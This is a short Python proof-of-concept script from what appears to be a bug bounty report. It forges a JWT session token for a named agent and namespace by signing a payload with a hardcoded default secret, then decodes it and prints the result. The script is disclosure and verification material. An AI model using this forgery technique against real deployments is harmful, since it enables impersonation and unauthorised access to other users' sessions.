#!/usr/bin/env python3
"""
PoC: JWT Forgery via Default Secret Key

Manual reproducer for the hardcoded default JWT signing key vulnerability.
Run this script from the repo root to verify the bug:

    python docs/bounty_reports/poc_forge_jwt.py

This is NOT part of the automated test suite — it is a manual verification
script that will naturally stop working once the vulnerability is fixed.
"""

import jwt
from datetime import datetime, timedelta
from pathlib import Path

DEFAULT_SECRET = "memanto-default-secret-change-in-production"

# Use absolute path so it works from any cwd
REPO_ROOT = Path(__file__).resolve().parent.parent.parent


def forge_token(agent_id: str = "poc-victim-agent") -> str:
    """Create a forged JWT session token using the publicly-known default key."""
    payload = {
        "agent_id": agent_id,
        "namespace": f"memanto_agent_{agent_id}",
        "session_id": "sess_poc_forged",
        "started_at": "2026-06-30T00:00:00",
        "expires_at": (datetime.utcnow() + timedelta(days=365)).isoformat(),
    }
    return jwt.encode(payload, DEFAULT_SECRET, algorithm="HS256")


if __name__ == "__main__":
    token = forge_token()
    decoded = jwt.decode(token, DEFAULT_SECRET, algorithms=["HS256"])

    print("=== PoC: JWT Forgery via Default Secret Key ===")
    print(f"  Agent:      {decoded['agent_id']}")
    print(f"  Namespace:  {decoded['namespace']}")
    print(f"  Expires:    {decoded['expires_at']}")
    print(f"  Token:      {token[:60]}...")
    print()
    print("✅  PoC passed — forged token accepted with default secret key.")
    print("   This will fail once the vulnerability is fixed (which is the goal).")
